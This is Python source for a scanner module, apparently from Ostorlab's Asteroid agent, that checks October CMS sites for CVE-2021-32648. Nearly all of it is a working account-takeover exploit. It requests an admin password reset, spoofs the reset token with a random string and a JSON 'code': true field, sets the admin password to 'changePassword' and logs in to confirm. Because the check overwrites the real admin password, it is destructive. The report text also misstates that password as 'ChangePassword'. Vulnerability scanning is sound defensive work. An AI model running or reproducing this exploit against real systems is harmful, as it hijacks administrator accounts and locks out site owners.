"""Agent Asteroid implementation for CVE-2021-32648. Has the potential to generate false positives."""

import logging
import random
import string
import re

from requests import exceptions as requests_exceptions
from urllib3 import exceptions
from urllib3 import disable_warnings
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from ostorlab.agent.kb import kb

from agent import definitions
from agent import exploits_registry

disable_warnings(exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 90
RESET_PATH = "/backend/backend/auth/restore"
PASSWORD_PATH = "/backend/backend/auth/reset/1"
SIGNIN_PATH = "/backend/backend/auth/signin"
FAILED_LOGIN = "The details you entered did not match our records. Please double-check and try again."

logger = logging.getLogger(__name__)


@exploits_registry.register
class CVE202132648Exploit(definitions.Exploit):
    """
    October CMS Improper Authentication: CVE-2021-32648.
    """

    def accept(self, target: definitions.Target) -> bool:
        try:
            r = self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return r.status_code == 200 and "october_session" in r.headers.get(
            "Set-Cookie", ""
        )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        if (
            self._trigger_reset(target.origin) is True
            and self._set_password(target.origin) is True
            and self._login_attempt(target.origin) is True
        ):
            vulnerability = self._generate_vulnerability_object(target)
            return [vulnerability]

        return []

    def _get_csrf(self, url: str) -> str | None:
        """Connect to Host and read the CSRF token so we can use it in POSTS"""
        csrf_pattern = b'<meta name="csrf-token" content="(.*?)">'
        try:
            csrf_request = self.session.get(f"{url}{RESET_PATH}")
        except requests_exceptions.RequestException:
            return None

        if csrf_request.status_code == 200:
            match = re.search(csrf_pattern, csrf_request.content)
            if match is not None:
                csrf_token = match.group(1)
                return csrf_token.decode()
        return None

    def _trigger_reset(self, url: str) -> bool:
        """Trigger a Password Reset Request for the admin account"""
        reset_url = f"{url}{RESET_PATH}"
        csrf_token = self._get_csrf(url)
        if csrf_token is not None:
            post_data = {"_token": csrf_token, "postback": 1, "login": "admin"}
            try:
                reset_request = self.session.post(
                    reset_url, data=post_data, timeout=DEFAULT_TIMEOUT
                )
            except requests_exceptions.RequestException:
                return False

            if reset_request.status_code == 200:
                return True
        return False

    def _login_attempt(self, url: str) -> bool:
        """checks if we can log in with the admin account."""
        login_url = f"{url}{SIGNIN_PATH}"
        csrf_token = self._get_csrf(url)
        if csrf_token is not None:
            post_data = {
                "_token": csrf_token,
                "postback": 1,
                "login": "admin",
                "password": "changePassword",
            }
            try:
                login_request = self.session.post(
                    login_url, data=post_data, timeout=DEFAULT_TIMEOUT
                )
            except requests_exceptions.RequestException:
                return False

            if (
                login_request.status_code == 200
                and FAILED_LOGIN not in login_request.text
            ):
                return True
        return False

    def _set_password(self, url: str) -> bool:
        """Send a request to set the admin password that will bypass the token checking"""
        # Generate a random string of len 42 to spoof a reset token
        chars = string.ascii_uppercase + string.digits + string.ascii_lowercase
        random_string = "".join(random.choice(chars) for _ in range(42))
        reset_url = f"{url}{PASSWORD_PATH}/{random_string}"
        csrf_token = self._get_csrf(url)
        if csrf_token is not None:
            post_data = {
                "_token": csrf_token,
                "postback": 1,
                "id": 1,
                "code": True,
                "password": "changePassword",
            }
            try:
                reset_request = self.session.post(
                    reset_url,
                    headers={"Content-Type": "application/json"},
                    json=post_data,
                    timeout=DEFAULT_TIMEOUT,
                )
            except requests_exceptions.RequestException:
                return False

            if reset_request.status_code == 200:
                return True
        return False

    def _generate_vulnerability_object(
        self, target: definitions.Target
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title="October CMS password recovery vulnerability: CVE-2021-32648",
            risk_rating="CRITICAL",
            short_description="octobercms in a CMS platform based on the Laravel PHP Framework. "
            "In affected versions of the october/system package an attacker can request an "
            "account password reset and then gain access to the account using a "
            "specially crafted request.",
            description="octobercms in a CMS platform based on the Laravel PHP Framework."
            " In affected versions of the october/system package an attacker can request an account "
            "password reset and then gain access to the account using a specially crafted request."
            " The issue has been patched in Build 472 and v1.1.5.",
            references={
                "NIST": "https://nvd.nist.gov/vuln/detail/CVE-2021-32648",
                "PaloAlto": "https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/",
            },
            recommendation="""
            Organizations running OctoberCMS prior to Build 472 and v1.1.5 are encouraged to update to the latest
            version. Additionally, in order for this vulnerability to be exploited, the web server 
            must be running PHP below 7.4. 
                    """,
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target.origin} is vulnerable to CVE-2021-32648: the admin user's"
            f" password being changed to `ChangePassword`."
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
